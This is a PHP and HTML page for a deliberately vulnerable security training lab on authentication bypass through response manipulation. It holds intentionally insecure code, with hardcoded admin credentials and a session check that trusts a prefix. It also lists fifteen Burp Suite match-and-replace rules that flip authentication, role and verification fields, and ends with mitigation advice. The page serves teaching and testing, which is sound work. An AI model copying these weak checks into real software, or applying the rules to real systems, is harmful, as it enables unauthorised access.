<?php
// Lab 5: Authentication Bypass
// Vulnerability: Authentication bypass via response manipulation

session_start();

$message = '';
$response_data = [];

// Simulate authentication bypass via response manipulation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'login') {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        
        if (!empty($username) && !empty($password)) {
            // Simulate authentication check
            $authenticated = ($username === 'admin' && $password === 'admin123');
            
            $response_data = [
                'username' => $username,
                'authenticated' => $authenticated,
                'admin' => $authenticated,
                'user_type' => $authenticated ? 'admin' : 'user',
                'status' => $authenticated ? 'success' : 'failed',
                'message' => $authenticated ? 'Login successful' : 'Invalid credentials',
                'session_id' => $authenticated ? 'sess_' . uniqid() : null,
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            $message = '<div class="alert alert-info">ℹ️ Response generated. Use Burp Suite to manipulate the authentication response.</div>';
        } else {
            $message = '<div class="alert alert-warning">⚠️ Please provide username and password.</div>';
        }
    } elseif ($action === 'check_session') {
        $session_id = $_POST['session_id'] ?? '';
        
        if (!empty($session_id)) {
            // Simulate session check
            $session_valid = (strpos($session_id, 'sess_') === 0);
            
            $response_data = [
                'session_id' => $session_id,
                'valid' => $session_valid,
                'authenticated' => $session_valid,
                'admin' => $session_valid,
                'user_type' => $session_valid ? 'admin' : 'guest',
                'status' => $session_valid ? 'active' : 'expired',
                'message' => $session_valid ? 'Session valid' : 'Session expired',
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            $message = '<div class="alert alert-info">ℹ️ Response generated. Use Burp Suite to manipulate the session response.</div>';
        } else {
            $message = '<div class="alert alert-warning">⚠️ Please provide session ID.</div>';
        }
    } elseif ($action === 'check_permissions') {
        $user_id = $_POST['user_id'] ?? '';
        $resource = $_POST['resource'] ?? '';
        
        if (!empty($user_id) && !empty($resource)) {
            // Simulate permission check
            $has_permission = ($user_id === 'admin');
            
            $response_data = [
                'user_id' => $user_id,
                'resource' => $resource,
                'permitted' => $has_permission,
                'authenticated' => $has_permission,
                'admin' => $has_permission,
                'status' => $has_permission ? 'allowed' : 'denied',
                'message' => $has_permission ? 'Access granted' : 'Access denied',
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            $message = '<div class="alert alert-info">ℹ️ Response generated. Use Burp Suite to manipulate the permission response.</div>';
        } else {
            $message = '<div class="alert alert-warning">⚠️ Please provide user ID and resource.</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: Authentication Bypass - Response Manipulation Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .auth-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .response-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .response-item {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border: 1px solid #334155;
        }

        .auth-rules {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .rule-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .rule-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .rule-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .status-failed {
            color: var(--accent-red);
            font-weight: bold;
        }

        .status-success {
            color: var(--accent-green);
            font-weight: bold;
        }

        .status-active {
            color: var(--accent-green);
            font-weight: bold;
        }

        .status-expired {
            color: var(--accent-red);
            font-weight: bold;
        }

        .status-allowed {
            color: var(--accent-green);
            font-weight: bold;
        }

        .status-denied {
            color: var(--accent-red);
            font-weight: bold;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Response Manipulation Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: Authentication Bypass</h1>
            <p class="hero-subtitle">Authentication bypass via response manipulation vulnerabilities</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates authentication bypass vulnerabilities where attackers can use Burp Suite to modify authentication responses and bypass login controls.</p>
            <p><strong>Objective:</strong> Understand how authentication bypass attacks work and how to exploit them using Burp Suite.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-person-check me-2"></i>Authentication System
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>User Login</h5>
                            <p>Test authentication with response manipulation:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="login">
                                <div class="mb-3">
                                    <label for="username" class="form-label">Username</label>
                                    <input type="text" class="form-control" id="username" name="username" placeholder="admin" required>
                                </div>
                                <div class="mb-3">
                                    <label for="password" class="form-label">Password</label>
                                    <input type="password" class="form-control" id="password" name="password" placeholder="admin123" required>
                                </div>
                                <button type="submit" class="btn btn-primary">Login</button>
                            </form>
                            
                            <hr>
                            
                            <h5>Session Check</h5>
                            <p>Check session validity:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="check_session">
                                <div class="mb-3">
                                    <label for="session_id" class="form-label">Session ID</label>
                                    <input type="text" class="form-control" id="session_id" name="session_id" placeholder="sess_12345" required>
                                </div>
                                <button type="submit" class="btn btn-primary">Check Session</button>
                            </form>
                            
                            <hr>
                            
                            <h5>Permission Check</h5>
                            <p>Check user permissions:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="check_permissions">
                                <div class="mb-3">
                                    <label for="user_id" class="form-label">User ID</label>
                                    <input type="text" class="form-control" id="user_id" name="user_id" placeholder="user123" required>
                                </div>
                                <div class="mb-3">
                                    <label for="resource" class="form-label">Resource</label>
                                    <input type="text" class="form-control" id="resource" name="resource" placeholder="admin_panel" required>
                                </div>
                                <button type="submit" class="btn btn-primary">Check Permissions</button>
                            </form>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Authentication Bypass Tester
                    </div>
                    <div class="card-body">
                        <div class="auth-warning">
                            <h5>⚠️ Authentication Bypass Warning</h5>
                            <p>This lab demonstrates authentication bypass vulnerabilities:</p>
                            <ul>
                                <li><code>Login Bypass</code> - Bypass login authentication</li>
                                <li><code>Session Bypass</code> - Bypass session validation</li>
                                <li><code>Permission Bypass</code> - Bypass permission checks</li>
                                <li><code>Admin Escalation</code> - Escalate to admin privileges</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Burp Suite Rules</h5>
                            <p>Use these Burp Suite Match and Replace rules:</p>
                            <ul>
                                <li><code>"authenticated":false</code> → <code>"authenticated":true</code></li>
                                <li><code>"admin":false</code> → <code>"admin":true</code></li>
                                <li><code>"status":"failed"</code> → <code>"status":"success"</code></li>
                                <li><code>"permitted":false</code> → <code>"permitted":true</code></li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testAuthBypass()" class="btn btn-primary">Test Auth Bypass</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if (!empty($response_data)): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Generated Response
                    </div>
                    <div class="card-body">
                        <div class="response-display">
                            <h5>Server Response (JSON):</h5>
                            <pre><?php echo json_encode($response_data, JSON_PRETTY_PRINT); ?></pre>
                            
                            <h5>Response Analysis:</h5>
                            <div class="response-item">
                                <div class="row align-items-center">
                                    <div class="col-md-3">
                                        <strong>Authenticated:</strong> <span class="status-<?php echo isset($response_data['authenticated']) && $response_data['authenticated'] ? 'success' : 'failed'; ?>"><?php echo isset($response_data['authenticated']) ? ($response_data['authenticated'] ? 'true' : 'false') : 'N/A'; ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Admin:</strong> <span class="status-<?php echo isset($response_data['admin']) && $response_data['admin'] ? 'success' : 'failed'; ?>"><?php echo isset($response_data['admin']) ? ($response_data['admin'] ? 'true' : 'false') : 'N/A'; ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Status:</strong> <span class="status-<?php echo isset($response_data['status']) && in_array($response_data['status'], ['success', 'active', 'allowed']) ? 'success' : 'failed'; ?>"><?php echo isset($response_data['status']) ? $response_data['status'] : 'N/A'; ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>User Type:</strong> <?php echo isset($response_data['user_type']) ? $response_data['user_type'] : 'N/A'; ?>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Authentication Bypass Rules
                    </div>
                    <div class="card-body">
                        <div class="auth-rules">
                            <div class="rule-card">
                                <div class="rule-title">Login Bypass</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"authenticated\":false",
  "string_replace": "\"authenticated\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Admin Escalation</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"admin\":false",
  "string_replace": "\"admin\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Status Bypass</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"status\":\"failed\"",
  "string_replace": "\"status\":\"success\""
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Permission Bypass</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"permitted\":false",
  "string_replace": "\"permitted\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">Session Bypass</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"valid\":false",
  "string_replace": "\"valid\":true"
}</div>
                            </div>
                            
                            <div class="rule-card">
                                <div class="rule-title">User Type Escalation</div>
                                <div class="rule-demo">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"user_type\":\"user\"",
  "string_replace": "\"user_type\":\"admin\""
}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Authentication Bypass</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> Burp Suite Match and Replace</li>
                        <li><strong>Issue:</strong> Client-side trust of authentication responses</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Login Bypass:</strong> Bypass login authentication</li>
                        <li><strong>Session Bypass:</strong> Bypass session validation</li>
                        <li><strong>Permission Bypass:</strong> Bypass permission checks</li>
                        <li><strong>Admin Escalation:</strong> Escalate to admin privileges</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Authentication Bypass Examples</h5>
            <p>Use these Burp Suite Match and Replace rules to exploit authentication bypass vulnerabilities:</p>
            
            <h6>1. Login Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"authenticated\":false",
  "string_replace": "\"authenticated\":true"
}

// This rule bypasses login authentication
// Example: "authenticated":false becomes "authenticated":true</div>

            <h6>2. Admin Escalation:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"admin\":false",
  "string_replace": "\"admin\":true"
}

// This rule escalates user to admin
// Example: "admin":false becomes "admin":true</div>

            <h6>3. Status Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"status\":\"failed\"",
  "string_replace": "\"status\":\"success\""
}

// This rule bypasses status validation
// Example: "status":"failed" becomes "status":"success"</div>

            <h6>4. Permission Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"permitted\":false",
  "string_replace": "\"permitted\":true"
}

// This rule bypasses permission checks
// Example: "permitted":false becomes "permitted":true</div>

            <h6>5. Session Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"valid\":false",
  "string_replace": "\"valid\":true"
}

// This rule bypasses session validation
// Example: "valid":false becomes "valid":true</div>

            <h6>6. User Type Escalation:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"user_type\":\"user\"",
  "string_replace": "\"user_type\":\"admin\""
}

// This rule escalates user type to admin
// Example: "user_type":"user" becomes "user_type":"admin"</div>

            <h6>7. Session Status Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"status\":\"expired\"",
  "string_replace": "\"status\":\"active\""
}

// This rule bypasses session expiration
// Example: "status":"expired" becomes "status":"active"</div>

            <h6>8. Access Status Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"status\":\"denied\"",
  "string_replace": "\"status\":\"allowed\""
}

// This rule bypasses access denial
// Example: "status":"denied" becomes "status":"allowed"</div>

            <h6>9. Message Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"message\":\"Invalid credentials\"",
  "string_replace": "\"message\":\"Login successful\""
}

// This rule changes error messages
// Example: "Invalid credentials" becomes "Login successful"</div>

            <h6>10. Simple Status Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": true,
  "rule_type": "response_body",
  "string_match": "{\"status\":\"0\"}",
  "string_replace": "{\"status\":\"1\",\"user_type\":\"admin\"}"
}

// This rule bypasses simple status
// Example: {"status":"0"} becomes {"status":"1","user_type":"admin"}</div>

            <h6>11. Header Manipulation:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": true,
  "rule_type": "request_header",
  "string_match": "{\"admin\", \"false\", admin_id \"0\"}",
  "string_replace": "{\"admin\", \"true\", admin_id \"1\"}"
}

// This rule manipulates request headers
// Example: {"admin", "false", admin_id "0"} becomes {"admin", "true", admin_id "1"}</div>

            <h6>12. Verification Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"verify\":false",
  "string_replace": "\"verify\":true"
}

// This rule bypasses verification checks
// Example: "verify":false becomes "verify":true</div>

            <h6>13. Email Verification Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"email_verified\":false",
  "string_replace": "\"email_verified\":true"
}

// This rule bypasses email verification
// Example: "email_verified":false becomes "email_verified":true</div>

            <h6>14. Account Status Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"account_active\":false",
  "string_replace": "\"account_active\":true"
}

// This rule bypasses account status checks
// Example: "account_active":false becomes "account_active":true</div>

            <h6>15. Role Bypass:</h6>
            <div class="code-block">{
  "comment": "Response Manipulation",
  "enabled": true,
  "is_simple_match": false,
  "rule_type": "response_body",
  "string_match": "\"role\":\"guest\"",
  "string_replace": "\"role\":\"admin\""
}

// This rule bypasses role restrictions
// Example: "role":"guest" becomes "role":"admin"</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Complete authentication bypass and unauthorized access</li>
                <li>Privilege escalation and admin access</li>
                <li>Session hijacking and account takeover</li>
                <li>Compliance violations and legal issues</li>
                <li>Data manipulation and integrity issues</li>
                <li>Business process disruption and operational impact</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement server-side authentication validation</li>
                    <li>Use response integrity checks and signatures</li>
                    <li>Implement proper session management</li>
                    <li>Use secure coding practices</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual authentication patterns</li>
                    <li>Implement proper input validation</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about security threats</li>
                    <li>Use secure session tokens</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use authentication bypass detection tools</li>
                    <li>Implement proper audit trails</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testAuthBypass() {
            alert('Authentication Bypass test initiated. Use Burp Suite Match and Replace rules above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
